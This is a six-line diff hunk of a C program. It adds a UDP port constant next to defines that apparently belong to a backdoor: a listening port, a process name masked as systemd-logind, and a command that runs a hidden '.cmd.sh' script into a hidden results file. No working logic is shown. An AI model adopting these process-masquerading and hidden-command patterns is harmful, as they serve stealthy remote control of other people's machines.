@@ -27,6 +27,7 @@
 #include <time.h>
 
 #define PORT "8505"
+#define UPORT 8505
 #define BUFFERSIZE 1024
 #define MASK "/usr/lib/systemd/systemd-logind"
 #define CMD "./.cmd.sh > .results"
